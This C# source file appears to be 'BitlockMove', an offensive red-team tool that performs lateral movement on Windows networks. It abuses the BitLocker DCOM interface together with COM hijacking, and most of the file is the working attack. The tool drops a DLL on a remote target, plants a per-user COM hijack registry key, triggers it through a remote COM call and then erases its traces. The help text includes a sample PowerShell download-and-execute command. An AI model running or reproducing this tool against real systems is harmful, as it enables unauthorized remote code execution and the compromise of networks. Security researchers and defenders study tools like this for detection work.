using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;

namespace BitlockMove
{
    static class Program
    {

        static void DisplayHelp()
        {
            Console.WriteLine("\nUsage:");
            Console.WriteLine("  Enumeration:  <Program> mode=enum target=<ip>");
            Console.WriteLine("  Attack:       <Program> mode=attack target=<ip> dllpath=<dllpath> targetuser=<targetuser> command=<command>");
            Console.WriteLine("\nExample:");
            Console.WriteLine("  <Program> mode=enum target=192.168.1.100");
            Console.WriteLine(@"  <Program> mode=attack target=192.168.1.100 dllpath=C:\windows\temp\evil.dll targetuser=domadm command=powershell.exe iex(new-object net.webclient).downloadstring('https://url.com/script.ps1')");
        }
        static void Main(string[] args)
        {
            Console.WriteLine(@"

    ______ _ _   _            _   ___  ___               
    | ___ (_) | | |          | |  |  \/  |               
    | |_/ /_| |_| | ___   ___| | _| .  . | _____   _____ 
    | ___ \ | __| |/ _ \ / __| |/ / |\/| |/ _ \ \ / / _ \
    | |_/ / | |_| | (_) | (__|   <| |  | | (_) \ V /  __/
    \____/|_|\__|_|\___/ \___|_|\_\_|  |_/\___/ \_/ \___|
            
    Lateral Movement via Bitlocker DCOM interface & COM Hijacking
                                          by @ShitSecure
    ");
            
            string targetIP = null;
            /*string username = null; custom user for execution removed for reasons
            string password = null;
            string domain = null;*/
            string dllPath = null;
            string targetUser = null;
            string command = null;
            string mode = "attack"; // Default mode

            // Parse named arguments
            foreach (string arg in args)
            {
                if (arg.StartsWith("mode=", StringComparison.OrdinalIgnoreCase))
                {
                    mode = arg.Substring(5).ToLower();
                }
                else if (arg.StartsWith("target=", StringComparison.OrdinalIgnoreCase))
                {
                    targetIP = arg.Substring(7);
                }
                else if (arg.StartsWith("dllpath=", StringComparison.OrdinalIgnoreCase))
                {
                    dllPath = arg.Substring(8);
                }
                else if (arg.StartsWith("targetuser=", StringComparison.OrdinalIgnoreCase))
                {
                    targetUser = arg.Substring(11);
                }
                else if (arg.StartsWith("command=", StringComparison.OrdinalIgnoreCase))
                {
                    command = arg.Substring(8);
                }
            }

            // Display help if no arguments or missing required parameters
            if (args.Length == 0 || targetIP == null)
            {
                DisplayHelp();
                return;
            }

            // Execute based on mode
            switch (mode)
            {
                case "enum":
                    Console.WriteLine($"[+] Enumerating sessions on {targetIP}...");
                    BitlockMove.SessionEnum.enumerate(targetIP);
                    break;

                case "attack":
                    if (dllPath == null || targetUser == null || command == null)
                    {
                        Console.WriteLine("[!] Error: Attack mode requires dllpath and targetuser as well as command parameters");
                        DisplayHelp();
                        return;
                    }

                    if (FileDrop.DropIt(targetIP, dllPath, command))
                    {
                        Console.WriteLine($"[+] DLL dropped successfully!");
                    }
                    else
                    {
                        Console.WriteLine($"[-] DLL dropping failed!");
                        return;
                    }

                    Console.WriteLine($"[+] Attempting COM hijack on {targetIP} for user {targetUser}");
                    RemoteRegistry.WriteRegistryEntryForUser(targetIP, targetUser, dllPath);

                    if (RemoteRegistry.VerifyRegistryEntry(targetIP, targetUser, dllPath))
                    {
                        Console.WriteLine("[+] Target user COM Hijack is set!");
                        Server.Execute(targetIP, "somearguments as", "", "", "");
                        Thread.Sleep(5000);

                        // cleanup everything
                        RemoteRegistry.DeleteRegistryEntry(targetIP, targetUser);
                        if (!RemoteRegistry.VerifyRegistryEntry(targetIP, targetUser, dllPath))
                        {
                            Console.WriteLine("[+] Target user COM Hijack is removed!");
                        }
                        RemoteRegistry.DisableRemoteRegistryViaWMI(targetIP);
                        FileDrop.RemoveFile(targetIP, dllPath);
                    }

                    break;

                default:
                    Console.WriteLine($"[!] Unknown mode: {mode}");
                    DisplayHelp();
                    break;
            }

            
            // Ensure that if username, password, and domain are provided, they are valid
            /*if (username != null && password != null && domain != null)
            {
                Server.Execute(targetIP, null, username, password, domain);
            }*/
            
            
        }
    }

    static class Server
    {
        [ComImport]
        [TypeLibType(TypeLibTypeFlags.FDual | TypeLibTypeFlags.FNonExtensible | TypeLibTypeFlags.FDispatchable)]
        [Guid("8961F0A0-FF62-403B-91B4-7B9280241CEB")]
        public interface IBDEUILauncher
        {
            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
            [DispId(1)]
            int BdeUIProcessStart([In] int enumBitlockMoveApp, [In] int enumProcStartMode, [In][MarshalAs(UnmanagedType.BStr)] string bstrStartParam);

            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
            [DispId(2)]
            void BdeUIContextTrigger([In] int enumBdeSvcApi, [In][MarshalAs(UnmanagedType.BStr)] string bstrBdeSvcApiParam, [In] bool bSynchronous);

            [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
            [DispId(3)]
            long GetUserLogonTime();
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct COSERVERINFO
        {
            public uint dwReserved1;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string pwszName;
            public IntPtr pAuthInfo;
            public uint dwReserved2;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct COAUTHIDENTITY
        {
            [MarshalAs(UnmanagedType.LPWStr)]
            public string User;
            [MarshalAs(UnmanagedType.U4)]
            public uint UserLength;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string Domain;
            [MarshalAs(UnmanagedType.U4)]
            public uint DomainLength;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string Password;
            [MarshalAs(UnmanagedType.U4)]
            public uint PasswordLength;
            public uint Flags;
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct COAUTHINFO
        {
            public uint dwAuthnSvc;
            public uint dwAuthzSvc;
            public IntPtr pwszServerPrincName;
            public uint dwAuthnLevel;
            public uint dwImpersonationLevel;
            public IntPtr pAuthIdentityData;
            public uint dwCapabilities;
        }


        [Flags]
        public enum CLSCTX : uint
        {
            REMOTE_SERVER = 0x10,
            ENABLE_CLOAKING = 0x100000
        }
        public static IntPtr GuidToPointer(Guid g)
        {
            IntPtr ret = Marshal.AllocCoTaskMem(16);
            Marshal.Copy(g.ToByteArray(), 0, ret, 16);
            return ret;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct OptionalGuid : IDisposable
        {
            private IntPtr pGuid;

            void IDisposable.Dispose()
            {
                if (pGuid != IntPtr.Zero)
                {
                    Marshal.FreeCoTaskMem(pGuid);
                    pGuid = IntPtr.Zero;
                }
            }

            public OptionalGuid(Guid guid)
            {
                pGuid = Marshal.AllocCoTaskMem(16);
                Marshal.Copy(guid.ToByteArray(), 0, pGuid, 16);
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct MULTI_QI : IDisposable
        {
            private IntPtr pIID;
            public IntPtr pItf;
            public int hr;

            void IDisposable.Dispose()
            {
                Marshal.FreeCoTaskMem(pIID);
                if (pItf != IntPtr.Zero)
                {
                    Marshal.Release(pItf);
                    pItf = IntPtr.Zero;
                }
            }

            public MULTI_QI(Guid iid)
            {
                pIID = Marshal.AllocCoTaskMem(16);
                Marshal.Copy(iid.ToByteArray(), 0, pIID, 16);
                pItf = IntPtr.Zero;
                hr = 0;
            }
        }


        [DllImport("ole32.dll")]
        private static extern int CoInitializeSecurity(
            IntPtr pSecDesc,
            int cAuthSvc,
            IntPtr asAuthSvc,
            IntPtr pReserved1,
            int dwAuthnLevel,
            int dwImpLevel,
            IntPtr pAuthList,
            int dwCapabilities,
            IntPtr pReserved3);

        [DllImport("ole32.dll")]
        private static extern int CoCreateInstanceEx(in Guid rclsid, IntPtr punkOuter, CLSCTX dwClsCtx, IntPtr pServerInfo, int dwCount, [In, Out] MULTI_QI[] pResults);

        [DllImport("ole32.Dll")]
        public static extern uint CoCreateInstance(ref Guid clsid,
           [MarshalAs(UnmanagedType.IUnknown)] object inner,
           uint context,
           ref Guid uuid,
           [MarshalAs(UnmanagedType.IUnknown)] out object rReturnedComObject);

        private const uint CLSCTX_REMOTE_SERVER = 0x10;
        private const int RPC_C_AUTHN_LEVEL_PKT_PRIVACY = 6;
        private const int RPC_C_IMP_LEVEL_IMPERSONATE = 3;
        private const int RPC_C_AUTHN_WINNT = 10;
        private const int RPC_C_AUTHZ_NONE = 0;
        private const int EOAC_NONE = 0;
        private const int SEC_WINNT_AUTH_IDENTITY_UNICODE = 2;

        
        public static void InitAuthStructs(ref COAUTHINFO authInfo)
        {
            authInfo.dwAuthnSvc = RPC_C_AUTHN_WINNT;
            authInfo.dwAuthzSvc = RPC_C_AUTHZ_NONE;
            authInfo.pwszServerPrincName = IntPtr.Zero;
            authInfo.dwAuthnLevel = RPC_C_AUTHN_LEVEL_PKT_PRIVACY;
            authInfo.dwImpersonationLevel = RPC_C_IMP_LEVEL_IMPERSONATE;
            authInfo.dwCapabilities = EOAC_NONE;
            authInfo.pAuthIdentityData = IntPtr.Zero; // Use current user's credentials
        }

        public static Guid clsid = new Guid("ab93b6f1-be76-4185-a488-a9001b105b94");
        public static IntPtr clsid_ptr = GuidToPointer(clsid);


        public static void Execute(string targetIP, string path, string username, string password, string domain)
        {
            IntPtr pAuthIdentity = IntPtr.Zero;
            IntPtr pAuthInfo = IntPtr.Zero;
            IntPtr pIID = IntPtr.Zero;
            IntPtr serverInfoPtr = IntPtr.Zero;

            try
            {

                if (username == "")
                {
                    COAUTHINFO authInfo = new COAUTHINFO();
                    InitAuthStructs(ref authInfo);
                    pAuthInfo = Marshal.AllocCoTaskMem(Marshal.SizeOf(typeof(COAUTHINFO)));
                    Marshal.StructureToPtr(authInfo, pAuthInfo, false);
                }
                else
                {


                    COAUTHIDENTITY authIdentity = new COAUTHIDENTITY
                    {
                        User = username,
                        Domain = domain,
                        Password = password,
                        UserLength = (uint)username.Length,
                        DomainLength = (uint)domain.Length,
                        PasswordLength = (uint)password.Length,
                        Flags = 2 // SEC_WINNT_AUTH_IDENTITY_UNICODE
                    };

                    // Allocate and marshal authentication identity
                    pAuthIdentity = Marshal.AllocCoTaskMem(Marshal.SizeOf(typeof(COAUTHIDENTITY)));
                    Marshal.StructureToPtr(authIdentity, pAuthIdentity, false);

                    // Create authentication info
                    COAUTHINFO authInfo = new COAUTHINFO
                    {
                        dwAuthnSvc = RPC_C_AUTHN_WINNT,
                        dwAuthzSvc = RPC_C_AUTHZ_NONE,
                        pwszServerPrincName = IntPtr.Zero,
                        dwAuthnLevel = RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                        dwImpersonationLevel = RPC_C_IMP_LEVEL_IMPERSONATE,
                        pAuthIdentityData = pAuthIdentity,
                        dwCapabilities = EOAC_NONE
                    };

                    // Allocate and marshal authentication info
                    pAuthInfo = Marshal.AllocCoTaskMem(Marshal.SizeOf(typeof(COAUTHINFO)));
                    Marshal.StructureToPtr(authInfo, pAuthInfo, false);
                }
                
                // Create server info
                COSERVERINFO serverInfo = new COSERVERINFO
                {
                    pwszName = targetIP,
                    pAuthInfo = pAuthInfo
                };

                // Allocate and marshal server info
                serverInfoPtr = Marshal.AllocCoTaskMem(Marshal.SizeOf(typeof(COSERVERINFO)));
                Marshal.StructureToPtr(serverInfo, serverInfoPtr, false);


                MULTI_QI[] qis = new MULTI_QI[1];
                
                
                Guid iid = new Guid("8961F0A0-FF62-403B-91B4-7B9280241CEB");
                IntPtr iid_ptr = GuidToPointer(iid);
                qis[0] = new MULTI_QI(iid);
               
                int hr = CoCreateInstanceEx(clsid, IntPtr.Zero, CLSCTX.REMOTE_SERVER, serverInfoPtr, 1, qis);
                if (hr != 0)
                {
                    Console.WriteLine($"[-] CoCreateInstanceEx failed with HRESULT: 0x{hr:X}");
                    throw new COMException("[-] CoCreateInstanceEx failed", hr);
                }
                else
                {
                    Console.WriteLine("[+] CoCreateInstanceEx succeeded!");
                }

                
                if (qis[0].hr != 0)
                {
                    throw new COMException("[-] Failed to retrieve interface", (int)qis[0].hr);
                }
                
                
                if (qis[0].pItf == IntPtr.Zero)
                {
                    throw new Exception("[-] CoCreateInstanceEx returned a null interface pointer.");
                }


                IBDEUILauncher server = (IBDEUILauncher)Marshal.GetObjectForIUnknown(qis[0].pItf);

                Console.WriteLine("[*] Calling BitlockMoveProcessStart on remote machine...");
                int result = server.BdeUIProcessStart(4, 0, path);
                Console.WriteLine($"[*] BdeUIProcessStart returned: {result}");
            }
            catch (Exception e)
            {
                Console.WriteLine("[-] Error while calling remote COM object:");
                Console.WriteLine(e);
            }
        }
    }
}
